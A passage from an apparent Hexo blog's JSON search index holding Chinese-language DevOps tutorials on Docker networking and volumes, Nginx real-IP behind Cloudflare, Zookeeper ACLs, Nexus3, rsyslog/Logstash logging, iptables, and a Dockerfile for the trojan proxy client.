Yes","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"MySQL","slug":"MySQL","permalink":"https://garywu520.github.io/tags/MySQL/"},{"name":"MySQL主从","slug":"MySQL主从","permalink":"https://garywu520.github.io/tags/MySQL%E4%B8%BB%E4%BB%8E/"}]},{"title":"docker固定容器IP","slug":"docker固定容器IP","date":"2020-01-06T06:17:59.000Z","updated":"2020-01-06T06:35:16.721Z","comments":true,"path":"2020/01/06/docker固定容器IP/","link":"","permalink":"https://garywu520.github.io/2020/01/06/docker%E5%9B%BA%E5%AE%9A%E5%AE%B9%E5%99%A8IP/","excerpt":"1. Docker三种网络模式docker安装后，默认会创建三种网络类型，bridge、host和none 12345# docker network lsNETWORK ID NAME DRIVER SCOPE631fadbc4865 bridge bridge local2fe72a388b82 host host local09474b45c7bf none null local bridge:网络桥接[默认模式]默认情况下启动、创建容器都是用该模式，所以每次docker容器重启时会按照顺序获取对应ip地址，这就导致容器每次重启，ip都发生变化 none：无指定网络启动容器时，可以通过–network=none,docker容器不会分配局域网ip host：主机网络docker容器的网络会附属在主机上，两者是互通的。","text":"1. Docker三种网络模式docker安装后，默认会创建三种网络类型，bridge、host和none 12345# docker network lsNETWORK ID NAME DRIVER SCOPE631fadbc4865 bridge bridge local2fe72a388b82 host host local09474b45c7bf none null local bridge:网络桥接[默认模式]默认情况下启动、创建容器都是用该模式，所以每次docker容器重启时会按照顺序获取对应ip地址，这就导致容器每次重启，ip都发生变化 none：无指定网络启动容器时，可以通过–network=none,docker容器不会分配局域网ip host：主机网络docker容器的网络会附属在主机上，两者是互通的。 2. 配置固定IP的容器 创建自定义网络,并指定一个子网网段 12345678docker network create --subnet=172.18.0.0/16 docker_net$ docker network lsNETWORK ID NAME DRIVER SCOPE631fadbc4865 bridge bridge locale41e337d212b docker_net bridge local2fe72a388b82 host host local09474b45c7bf none null local 运行Docker容器【指定IP地址】 1docker run -itd --name centos_test --network docker_net --ip 172.18.0.2 centos:latest /bin/bash 注： 必须在自定义网络上给容器指定IP地址 由于我们创建了一个自定义网络，通过ip address可以看到新网卡名称为br-e41e337d212b，故还需要在iptables中添加此网卡的转发规则 1234#docker_net iptables -A FORWARD -i br-e41e337d212b -o eth0 -j ACCEPTiptables -A FORWARD -i eth0 -o br-e41e337d212b -j ACCEPTiptables -A FORWARD -i br-e41e337d212b -o br-e41e337d212b -j ACCEPT 允许br-e41e337d212b与eth0物理网卡转发，允许br-e41e337d212b网络的容器间转发 docker 与 iptables网络转发: 参考","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Docker","slug":"Docker","permalink":"https://garywu520.github.io/tags/Docker/"},{"name":"固定IP","slug":"固定IP","permalink":"https://garywu520.github.io/tags/%E5%9B%BA%E5%AE%9AIP/"}]},{"title":"Nginx获取CDN上用户的真实IP地址","slug":"Nginx获取CDN上用户的真实IP地址","date":"2019-12-23T08:18:42.000Z","updated":"2019-12-23T09:05:53.544Z","comments":true,"path":"2019/12/23/Nginx获取CDN上用户的真实IP地址/","link":"","permalink":"https://garywu520.github.io/2019/12/23/Nginx%E8%8E%B7%E5%8F%96CDN%E4%B8%8A%E7%94%A8%E6%88%B7%E7%9A%84%E7%9C%9F%E5%AE%9EIP%E5%9C%B0%E5%9D%80/","excerpt":"一、场景 Nginx配置的域名使用了Cloudflare CDN服务，Nginx日志获取到的客户端IP不是用户的真实IP地址，进而不能对相关接口服务做访问限制。 二、一般情况获取用户真实IP12345#在location区段加入以下配置proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;","text":"一、场景 Nginx配置的域名使用了Cloudflare CDN服务，Nginx日志获取到的客户端IP不是用户的真实IP地址，进而不能对相关接口服务做访问限制。 二、一般情况获取用户真实IP12345#在location区段加入以下配置proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 三、获取CDN上用户的真实IP 确认Nginx是否支持 12$ nginx -V #确认有没有 --with-http_realip_module模块，有表示支持，没有可能需要编译 编译 进入nginx 源码安装包目录下 configure 的参数就和原来保持一样，只是增加一个–with-http_realip_module 例如：–prefix=/usr/local/nginx –with-http_stub_status_module –with-http_realip_module make &amp;&amp; make install 至于平滑升级，可直接执行 killall -s USR2 nginx 接下来编辑location区段，加入以下信息 123456#Cloudflare CDN IP段set_real_ip_from 131.0.72.0/22;set_real_ip_from 131.0.72.0/22;......real_ip_header X-Forwarded-For;real_ip_recursive on; 注：set_real_ip_from要填写CDN真实的IP或IP段 Cloudflare CDN IP段: https://www.cloudflare.com/ips/ 到此配置完成，结合allow/deny规则 即可对客户端IP做访问限制了。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Nginx","slug":"Nginx","permalink":"https://garywu520.github.io/tags/Nginx/"},{"name":"CDN","slug":"CDN","permalink":"https://garywu520.github.io/tags/CDN/"},{"name":"IP","slug":"IP","permalink":"https://garywu520.github.io/tags/IP/"}]},{"title":"docker部署网盘seafile","slug":"docker部署网盘seafile","date":"2019-12-18T06:37:19.000Z","updated":"2019-12-18T06:47:31.481Z","comments":true,"path":"2019/12/18/docker部署网盘seafile/","link":"","permalink":"https://garywu520.github.io/2019/12/18/docker%E9%83%A8%E7%BD%B2%E7%BD%91%E7%9B%98seafile/","excerpt":"1. Github项目 seafile docker","text":"1. Github项目 seafile docker 2. 运行seafile1234567docker run -d --name seafile \\ -e SEAFILE_SERVER_HOSTNAME=cloud.qst.com \\ -e SEAFILE_ADMIN_EMAIL=admin@xxx.com \\ -e SEAFILE_ADMIN_PASSWORD=passworld \\ -v /data/A/seafile:/shared \\ -p 9003:80 \\ seafileltd/seafile:latest 注：使用如下参数设定管理员账号密码 -e SEAFILE_SERVER_HOSTNAME 这里不能写IP，必须写域名 -e SEAFILE_ADMIN_EMAIL=admin@xxx.com -e SEAFILE_ADMIN_PASSWORD=passworld 3. 访问1http://192.168.1.8:9003","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"seafile","slug":"seafile","permalink":"https://garywu520.github.io/tags/seafile/"}]},{"title":"docker数据持久化","slug":"docker数据持久化","date":"2019-12-17T09:25:43.000Z","updated":"2019-12-18T06:38:12.778Z","comments":true,"path":"2019/12/17/docker数据持久化/","link":"","permalink":"https://garywu520.github.io/2019/12/17/docker%E6%95%B0%E6%8D%AE%E6%8C%81%E4%B9%85%E5%8C%96/","excerpt":"一、前言对于业务首先考虑清楚，docker容器服务数据是存放在哪个目录的，那么就持久化这个目录或子目录即可。 而对于二进制启动文件与数据目录[如log目录]在同目录下，那么只需持久化log子目录即可。需要使用–privileged=true参数用来防止目录没有权限","text":"一、前言对于业务首先考虑清楚，docker容器服务数据是存放在哪个目录的，那么就持久化这个目录或子目录即可。 而对于二进制启动文件与数据目录[如log目录]在同目录下，那么只需持久化log子目录即可。需要使用–privileged=true参数用来防止目录没有权限 二、创建数据卷12#Dockerfile声明数据卷VOLUME /var/lib/mysql 12#docker run过程中创建数据卷docker run --name nginx-data -v /data/A/mysql:/var/lib/mysql mysql 注： Docker会自动生成一个目录作为挂载的目录。 即使容器被删除，宿主机中的目录也不会被删除。 三、查看删除数据卷12#查看docker容器数据卷$ docker inspect 容器ID 12#删除数据卷$ docker rm -v 容器ID","categories":[],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://garywu520.github.io/tags/Docker/"},{"name":"持久化","slug":"持久化","permalink":"https://garywu520.github.io/tags/%E6%8C%81%E4%B9%85%E5%8C%96/"}]},{"title":"给zookeeper添加ACL基本认证","slug":"给zookeeper添加基本认证","date":"2019-12-12T08:58:01.000Z","updated":"2019-12-12T09:15:19.858Z","comments":true,"path":"2019/12/12/给zookeeper添加基本认证/","link":"","permalink":"https://garywu520.github.io/2019/12/12/%E7%BB%99zookeeper%E6%B7%BB%E5%8A%A0%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81/","excerpt":"添加一个认证用户 12#密码为明文addauth digest user1:&#x27;password1&#x27; 设置权限 1setAcl / auth:user1:password1:cdrwa 查看ACL设置 1getAcl /path","text":"添加一个认证用户 12#密码为明文addauth digest user1:&#x27;password1&#x27; 设置权限 1setAcl / auth:user1:password1:cdrwa 查看ACL设置 1getAcl /path 连接示例 1234567891011$ zkCli.sh -server 127.0.0.1:12181[zk: 127.0.0.1:12181(CONNECTED) 1] ls /Authentication is not valid : /$[zk: 127.0.0.1:12181(CONNECTED) 2] getAcl /&#x27;digest,&#x27;user1:xuyC7ITdZYcNgdrRrz+l5XtaUog=: cdrwa[zk: 127.0.0.1:12181(CONNECTED) 3] addauth digest zhaiwei:&#x27;xxxxxx&#x27;[zk: 127.0.0.1:12181(CONNECTED) 4] ls /[zookeeper] 参考：阿里云社区","categories":[],"tags":[{"name":"zookeeper","slug":"zookeeper","permalink":"https://garywu520.github.io/tags/zookeeper/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zk","slug":"zk","permalink":"https://garywu520.github.io/tags/zk/"},{"name":"ACL","slug":"ACL","permalink":"https://garywu520.github.io/tags/ACL/"}]},{"title":"使用阿里云免费的Docker私有仓库","slug":"使用阿里云免费的Docker私有仓库","date":"2019-12-11T07:30:13.000Z","updated":"2019-12-11T07:34:06.901Z","comments":true,"path":"2019/12/11/使用阿里云免费的Docker私有仓库/","link":"","permalink":"https://garywu520.github.io/2019/12/11/%E4%BD%BF%E7%94%A8%E9%98%BF%E9%87%8C%E4%BA%91%E5%85%8D%E8%B4%B9%E7%9A%84Docker%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/","excerpt":"貌似只要购买了ECC云服务器，就可以免费开通这个服务。 1. 访问 阿里云容器镜像服务链接：https://cr.console.aliyun.com/cn-hongkong/instances/repositories 首先要设置一个叫做Registry密码，这个密码用来推送/拉取Docker镜像使用 2. 创建私有镜像仓库默认实例 —&gt; 镜像仓库 —&gt; 创建镜像仓库 可以选择镜像仓库的地域，这里开通的是香港节点的私有仓库","text":"貌似只要购买了ECC云服务器，就可以免费开通这个服务。 1. 访问 阿里云容器镜像服务链接：https://cr.console.aliyun.com/cn-hongkong/instances/repositories 首先要设置一个叫做Registry密码，这个密码用来推送/拉取Docker镜像使用 2. 创建私有镜像仓库默认实例 —&gt; 镜像仓库 —&gt; 创建镜像仓库 可以选择镜像仓库的地域，这里开通的是香港节点的私有仓库 3. 推送本地Docker镜像到阿里云私有仓库12345678#登录阿里云Docker Registry[按照提示输入Registry密码]docker login --username=xxxxxx@1009xxx8864439 registry.cn-hongkong.aliyuncs.com#设置镜像Tagsudo docker tag [Image Id] registry.cn-hongkong.aliyuncs.com/qst_images/qst_store:[镜像名_版本号]#推送镜像docker push registry.cn-hongkong.aliyuncs.com/qst_images/qst_store:[镜像名_版本号] 4. 拉取阿里云私有仓库镜像12345#登录阿里云Docker Registrydocker login --username=--username=xxxxxx@1009xxx8864439 registry.cn-hongkong.aliyuncs.com#拉取镜像docker pull registry.cn-hongkong.aliyuncs.com/qst_images/qst_store:[镜像名_版本号]","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Docker","slug":"Docker","permalink":"https://garywu520.github.io/tags/Docker/"},{"name":"阿里云","slug":"阿里云","permalink":"https://garywu520.github.io/tags/%E9%98%BF%E9%87%8C%E4%BA%91/"},{"name":"镜像仓库","slug":"镜像仓库","permalink":"https://garywu520.github.io/tags/%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93/"}]},{"title":"Maven私服部署-Docker安装nexus3","slug":"Maven私服部署-Docker安装nexus3","date":"2019-12-10T08:37:29.000Z","updated":"2019-12-10T08:39:40.527Z","comments":true,"path":"2019/12/10/Maven私服部署-Docker安装nexus3/","link":"","permalink":"https://garywu520.github.io/2019/12/10/Maven%E7%A7%81%E6%9C%8D%E9%83%A8%E7%BD%B2-Docker%E5%AE%89%E8%A3%85nexus3/","excerpt":"1. 拉取nexus3镜像123docker search nexus3docker pull sonatype/nexus3docker images 2. 运行nexus容器1docker run -id --privileged=true --name=nexus3 --restart=always -p 18081:8081 -v /data/A/nexus:/data/A/nexus sonatype/nexus3:latest","text":"1. 拉取nexus3镜像123docker search nexus3docker pull sonatype/nexus3docker images 2. 运行nexus容器1docker run -id --privileged=true --name=nexus3 --restart=always -p 18081:8081 -v /data/A/nexus:/data/A/nexus sonatype/nexus3:latest 参数解释： -id 创建守护式容器 –privileed=true 授权root权限(当挂载目录时，必须使用此项授权，否则容器会访问宿主机权限不足) –name 给容器命名 -p 映射端口 -v 映射目录 3. 访问nexus3docker运行后，稍等几分钟再进行访问 Web访问地址：http://公网IP:18081 12345默认账号：admin#默认密码需要登录docker查看，密码保存在了/nexus-data/admin.password文件中，进入docker查看：docker exec -it nexus3 /bin/bashcat /nexus-data/admin.password 4. 查看仓库设置齿轮 —&gt; Repositories 5. 在项目中配置私服在 设置齿轮 —&gt; Repositories —&gt;maven-public , URL列，点击COPY 把这个地址配置在本地maven的settings文件 12345678910111213141516171819#注意：是public group仓库地址而不是releases或snapshots仓库，public默认包含了这两个仓库&lt;profiles&gt; &lt;profile&gt; &lt;id&gt;dev&lt;/id&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;local-nexus&lt;/id&gt; &lt;url&gt;http://192.168.3.128:8081/repository/maven-public/&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;/profile&gt; &lt;/profiles&gt; 配置maven settings文件的服务器用户名密码 12345678910111213#注意：id为私服中releases和snapshots仓库名，必须一致&lt;servers&gt; &lt;server&gt; &lt;id&gt;maven-releases&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt; &lt;/server&gt; &lt;server&gt; &lt;id&gt;maven-snapshots&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt; &lt;/server&gt; &lt;/servers&gt; 在项目父pom文件中配置部署环境，注意id及URL必须与nexus仓库对应 12345678910111213&lt;!--私服仓库--&gt; &lt;distributionManagement&gt; &lt;repository&gt; &lt;id&gt;maven-releases&lt;/id&gt; &lt;name&gt;Nexus Release Repository&lt;/name&gt; &lt;url&gt;http://192.168.3.128:8081/repository/maven-releases/&lt;/url&gt; &lt;/repository&gt; &lt;snapshotRepository&gt; &lt;id&gt;maven-snapshots&lt;/id&gt; &lt;name&gt;Nexus Snapshot Repository&lt;/name&gt; &lt;url&gt;http://192.168.3.128:8081/repository/maven-snapshots/&lt;/url&gt; &lt;/snapshotRepository&gt; &lt;/distributionManagement&gt; 重新打开项目，对需要的模块进行deploy 最后在nexus中查看上传的jar包即可 参考：Maven私服:Docker安装nexus3","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"maven","slug":"maven","permalink":"https://garywu520.github.io/tags/maven/"},{"name":"nexus3","slug":"nexus3","permalink":"https://garywu520.github.io/tags/nexus3/"}]},{"title":"Docker容器应用的logs日志收集","slug":"Docker容器应用的LOG日志收集","date":"2019-12-03T07:18:35.000Z","updated":"2019-12-04T07:38:31.760Z","comments":true,"path":"2019/12/03/Docker容器应用的LOG日志收集/","link":"","permalink":"https://garywu520.github.io/2019/12/03/Docker%E5%AE%B9%E5%99%A8%E5%BA%94%E7%94%A8%E7%9A%84LOG%E6%97%A5%E5%BF%97%E6%94%B6%E9%9B%86/","excerpt":"1. 查看容器log插件Docker有很多日志插件，默认使用json-file。只有使用json-file格式的时候，docker logs -f 才可以显示实时日志。 查看docker默认的日志插件 1docker info | grep &#x27;Logging Driver&#x27; 当容器运行时，docker会在宿主机上创建一个该容器相关的文件，然后将容器产生的日志转存到该文件下。docker logs -f 命令就会找到该文件内容并显示在终端上","text":"1. 查看容器log插件Docker有很多日志插件，默认使用json-file。只有使用json-file格式的时候，docker logs -f 才可以显示实时日志。 查看docker默认的日志插件 1docker info | grep &#x27;Logging Driver&#x27; 当容器运行时，docker会在宿主机上创建一个该容器相关的文件，然后将容器产生的日志转存到该文件下。docker logs -f 命令就会找到该文件内容并显示在终端上 2. 启用syslog服务默认，Linux 操作系统已经安装了 Syslog 软件包，但它叫 Rsyslog。无需单独安装 1rsyslogd -v 如果要开启 Rsyslog 服务，我们必须对 Rsyslog 进行配置 vim /etc/rsyslog.conf 1234567#启用服务器端口监听$ModLoad imtcp$InputTcpServerRun 5000#当有多个docker容器服务的日志发送到syslog的时候，进行日志区分,实际区分名称与docker容器ID一一对应$template DockerLogs,&quot;/var/log/syslog/%fromhost-ip%-%programname%.log&quot;*.* ?DockerLogs 123456mkdir -p /var/log/syslogsystemctl restart rsyslog[root@test ~]# netstat -lntup|grep 5000 tcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 9406/rsyslogd tcp6 0 0 :::5000 :::* LISTEN 9406/rsyslogd 3. 为容器配置log插件 默认支持的log插件：参考 在启动容器时，可以使用 –log-driver 参数指定不同的日志插件，并使用 –log-opt参数进行响应设置。 下面是一个指定 Logging Driver 为 syslog 并传送到 logstash 的例子 12345678docker run \\-v /etc/trojan:/etc/trojan \\-p 1080:1080 \\--name trojan \\--log-driver syslog \\--log-opt syslog-address=tcp://192.168.1.10:5000 \\--log-opt syslog-facility=daemon \\ -d trojan:v2 注释： –log-driver 指定日志插件为syslog –log-opt syslog-address 指定把日志发送到的syslog服务器地址 –log-opt syslog-facility 指定要使用的syslog工具 4. 收集容器应用log在收集之前，可以先确认系统/var/log/message中是否已经有了docker中的trojan日志 123456[root@test supervisord.d]# tail -f /var/log/syslog/127.0.0.1-23357beeb213.log......Dec 4 14:12:07 localhost 23357beeb213[27509]: [2019-12-04 06:12:07] [INFO] 172.17.0.1:56160 disconnected, 10250 bytes received, 395 bytes sent, lasted for 17 secondsDec 4 14:12:07 localhost 23357beeb213[27509]: [2019-12-04 06:12:07] [INFO] 172.17.0.1:56168 disconnected, 1338 bytes received, 395 bytes sent, lasted for 16 secondsDec 4 14:12:20 localhost 23357beeb213[27509]: [2019-12-04 06:12:20] [INFO] 172.17.0.1:56212 requested connection to beacons.gvt2.com:443...... 既然文件都已经存储到系统文件了，索性logstash input直接使用file模块好了，就不用syslog了。如下： logstash配置 12345678910111213141516input &#123; file &#123; path =&gt; [&quot;/var/log/syslog/127.0.0.1-23357beeb213.log&quot;] type =&gt; &quot;trojan_docker_1080&quot; start_position =&gt; &quot;beginning&quot; sincedb_path =&gt; &quot;/usr/local/logstash-6.5.4/tmp/sincedb1&quot; &#125;output &#123; if [type] == &quot;trojan_docker_1080&quot; &#123; elasticsearch &#123; hosts =&gt; [&quot;xx.xx.xx.xx:9200&quot;] index =&gt; &quot;logstash-trojan_docker_1080-%&#123;+YYYY-MM-dd&#125;&quot; &#125;&#125; 12#测试语法正确性bin/logstash -f /usr/local/logstash-6.5.4/conf.d/logstash.conf -t 重启logstash","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"logs","slug":"logs","permalink":"https://garywu520.github.io/tags/logs/"},{"name":"日志收集","slug":"日志收集","permalink":"https://garywu520.github.io/tags/%E6%97%A5%E5%BF%97%E6%94%B6%E9%9B%86/"}]},{"title":"centos7 yum docker","slug":"centos7-yum-docker","date":"2019-12-03T05:36:48.000Z","updated":"2019-12-03T05:41:48.304Z","comments":true,"path":"2019/12/03/centos7-yum-docker/","link":"","permalink":"https://garywu520.github.io/2019/12/03/centos7-yum-docker/","excerpt":"Install docker-ce 1234567yum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repoyum install -y docker-cesystemctl enable docker.servicesystemctl start docker.servicesystemctl status docker.service","text":"Install docker-ce 1234567yum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repoyum install -y docker-cesystemctl enable docker.servicesystemctl start docker.servicesystemctl status docker.service Install docker-compose 123456yum install epel-releaseyum install -y python-pippip install docker-composeyum upgrade python*docker-compose version 参考：Install Docker &amp; Docker Compose - Centos 7","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"docker-compose","slug":"docker-compose","permalink":"https://garywu520.github.io/tags/docker-compose/"},{"name":"centos7","slug":"centos7","permalink":"https://garywu520.github.io/tags/centos7/"},{"name":"yum","slug":"yum","permalink":"https://garywu520.github.io/tags/yum/"}]},{"title":"Docker与iptables防火墙","slug":"Docker与iptables防火墙","date":"2019-12-03T03:21:55.000Z","updated":"2020-01-16T09:31:09.000Z","comments":true,"path":"2019/12/03/Docker与iptables防火墙/","link":"","permalink":"https://garywu520.github.io/2019/12/03/Docker%E4%B8%8Eiptables%E9%98%B2%E7%81%AB%E5%A2%99/","excerpt":"假设已有服务器已经配置了iptables，这个时候安装并运行docker容器后，docker会自动向iptables添加 FORWARD规则来实现与宿主机的网络通信。 一旦不小心，直接在iptables中新开放了端口操作，重载iptables规则后，docker添加的规则会被覆盖，这就导致了docker服务的网络异常。怎么解决？","text":"假设已有服务器已经配置了iptables，这个时候安装并运行docker容器后，docker会自动向iptables添加 FORWARD规则来实现与宿主机的网络通信。 一旦不小心，直接在iptables中新开放了端口操作，重载iptables规则后，docker添加的规则会被覆盖，这就导致了docker服务的网络异常。怎么解决？ 开启内核转发12$ sysctl net.ipv4.ip_forwardnet.ipv4.ip_forward = 1 1. 首先要在防火墙配置文件里面添加docker FORWARD规则iptables需要允许docker转发及容器间通信 1234567#Dockeriptables -A FORWARD -i docker0 -o eth0 -j ACCEPTiptables -A FORWARD -i eth0 -o docker0 -j ACCEPTiptables -A FORWARD -i docker0 -o docker0 -j ACCEPT#允许bridge网络容器访问外网iptables -t nat -A POSTROUTING -s 172.17.0.0/16 -o eth0 -j MASQUERADE 注：如果有多个自定义网络，容器访问外网同样需要配置masquerade 2. 修改docker服务启动配置其次, ，在docker启动配置中，把docker自定义iptables规则移除 123# 通过此命令获取docker systemd的启动配置文件，接下来要修改$ systemctl status docker/usr/lib/systemd/system/docker.service vim /usr/lib/systemd/system/docker.service 12#找到如下行并添加参数：--iptables=false,意思是启动docker的时候不自动向iptables添加规则ExecStart=/usr/bin/dockerd -H fd:// --iptables=false --containerd=/run/containerd/containerd.sock 3. 重启服务 重载iptables规则 首先stop掉已有容器 重启docker systemctl daemon-reload &amp;&amp; systemctl restart docker 启动docker容器 这个时候，在iptables中再开启端口的时候，就不怕docker容器服务的网络会出现问题了。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"iptables","slug":"iptables","permalink":"https://garywu520.github.io/tags/iptables/"}]},{"title":"Postwoman API接口测试","slug":"Postwoman-API接口测试","date":"2019-12-03T02:12:34.000Z","updated":"2019-12-03T02:22:45.731Z","comments":true,"path":"2019/12/03/Postwoman-API接口测试/","link":"","permalink":"https://garywu520.github.io/2019/12/03/Postwoman-API%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/","excerpt":"对于经常进行接口调试的同学来说，应该是比较熟悉 Postman 了。Postman 虽然功能强大，但也有很多弊端。比如：不支持 Web 方式，需要安装客户端软件等。如果你只想简单地测试下接口返回，就需要安装一个客户端工具就显得比较麻烦了。 为了解决这个痛点，今天就给大家推荐一个轻量级、功能强大且颜值超高的神器 Postwoman。Postwoman 是一个 HTTP API 测试工具，支持 REST、SOAP 和 GraphQL 请求，并且可以实现自动化接口测试、接口监控、模拟接口数据、生成接口文档、多人协作等功能。简单来说，Postwoman 是一个好用且功能非常强大的 API 调试工具。","text":"对于经常进行接口调试的同学来说，应该是比较熟悉 Postman 了。Postman 虽然功能强大，但也有很多弊端。比如：不支持 Web 方式，需要安装客户端软件等。如果你只想简单地测试下接口返回，就需要安装一个客户端工具就显得比较麻烦了。 为了解决这个痛点，今天就给大家推荐一个轻量级、功能强大且颜值超高的神器 Postwoman。Postwoman 是一个 HTTP API 测试工具，支持 REST、SOAP 和 GraphQL 请求，并且可以实现自动化接口测试、接口监控、模拟接口数据、生成接口文档、多人协作等功能。简单来说，Postwoman 是一个好用且功能非常强大的 API 调试工具。 一、什么是postwoman？ Postwoman 是一个基于 Vue 开发的的 Web 项目，功能类似 Poatman 的免费且美观的开源替代方案，它可以帮助开发人员更快地创建请求，提升工作效率。目前，该项目在 Github 上的 Star 数已经超过 11k 了！ 项目地址：https://github.com/liyasthomas/postwoman 二、Postwoman功能介绍 Postwoman 相关特性 采用简约的 UI 设计，简单的设计是最好的设计 响应速度更快，软件使用更轻量、更简洁 实时发送请求并获取/复制响应 Postwoman 支持的方法 GET HEAD POST PUT DELETE OPTIONS PATCH Postwoman 支持界面定制 支持主题选择：Kinda Dark（默认）、Clearly White、Just Black 和 System 主题 支持自定义强调颜色：绿色（默认）、黄色、粉红色、红色、紫色、橙色、青色和蓝色 其它支持的特性 支持以 PWA 方式进行安装 支持离线使用 内存和 CPU 使用率非常低 支持多平台、多设备 支持 WebSocket 支持 GraphQL 支持多种 HTTP 认证方式 …… 三、如何使用PostwomanPostwoman 既然是一个 Web 项目，使用起来也就非常简单，你只需直接访问其官网地址即可直接使用。 官网地址：https://postwoman.io/ 如果你想在本地自行搭建也是可以的，Docker部署方式如下： 12345# 拉取 Postwoman 相关镜像$ docker pull liyasthomas/postwoman# 运行一个 Postwoman 的容器$ docker run -p 3000:3000 liyasthomas/postwoman:latest 搭建成功后，你只需打开浏览器访问对应主机 IP 的 3000 端口即可访问本地的 Postwoman 环境。 如果你觉得 Postman 不够好用或者确实是想要使用一个界面更加好看的接口调试工具，那么 Postwoman 将是你最佳的选择！ 参考：微信公众号：运维之美","categories":[],"tags":[{"name":"postman","slug":"postman","permalink":"https://garywu520.github.io/tags/postman/"},{"name":"postwoman","slug":"postwoman","permalink":"https://garywu520.github.io/tags/postwoman/"},{"name":"API","slug":"API","permalink":"https://garywu520.github.io/tags/API/"},{"name":"接口测试","slug":"接口测试","permalink":"https://garywu520.github.io/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"}]},{"title":"使用Dockerfile制作trojan镜像","slug":"使用Dockerfile制作trojan镜像","date":"2019-12-02T11:00:33.000Z","updated":"2019-12-02T11:26:23.511Z","comments":true,"path":"2019/12/02/使用Dockerfile制作trojan镜像/","link":"","permalink":"https://garywu520.github.io/2019/12/02/%E4%BD%BF%E7%94%A8Dockerfile%E5%88%B6%E4%BD%9Ctrojan%E9%95%9C%E5%83%8F/","excerpt":"此Dockerfile文件具有参考意义，为制作其他服务镜像打好基础。比如容器内的服务如何在启动容器后，自动运行。 环境 安装好docker docker pull 好centos基础镜像","text":"此Dockerfile文件具有参考意义，为制作其他服务镜像打好基础。比如容器内的服务如何在启动容器后，自动运行。 环境 安装好docker docker pull 好centos基础镜像 1. 创建Dockerfile空白文件123mkdir /opt/docker_trojancd /opt/docker_trojantouch Dockerfile cat Dockerfile 1234567From centos:centos7.7.1908RUN mkdir /etc/trojanADD ./trojan/ /etc/trojanRUN chmod +x /etc/trojan/trojanEXPOSE 1080ENTRYPOINT [&quot;/etc/trojan/trojan&quot;,&quot;-c&quot;,&quot;/etc/trojan/client.json&quot;] 注： 把需要拷贝到容器的源目录，与Dockerfile放在同级目录 使用ADD指令拷贝目录的时候，需要保证目标目录已存在 ENTRYPOINT 指令,当容器启动时，自动启动容器内服务 2. 制作镜像1docker build -t trojan:v2 . 123456789101112131415161718192021#内容输出# docker build -t trojan:v2 .Sending build context to Docker daemon 4.023MBStep 1/5 : From centos:centos7.7.1908 ---&gt; 08d05d1d5859Step 2/5 : RUN mkdir /etc/trojan ---&gt; Running in 0d72b0e1963cRemoving intermediate container 0d72b0e1963c ---&gt; ecc12edb1e6fStep 3/5 : ADD ./trojan/ /etc/trojan ---&gt; 64b8fc8bcacdStep 4/5 : RUN chmod +x /etc/trojan/trojan ---&gt; Running in 9bd8d38d634dRemoving intermediate container 9bd8d38d634d ---&gt; e236ceda286dStep 5/5 : CMD /etc/trojan/trojan -c /etc/trojan/client.json ---&gt; Running in 17b302a27bc1Removing intermediate container 17b302a27bc1 ---&gt; f476f8cd236bSuccessfully built f476f8cd236bSuccessfully tagged trojan:v2 3. 查看新镜像1234[root@test docker_trojan]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEtrojan v2 316c01516fdb 3 minutes ago 212MBcentos centos7.7.1908 08d05d1d5859 2 weeks ago 204MB 4. 使用新镜像启动docker1docker run -v /etc/trojan:/etc/trojan 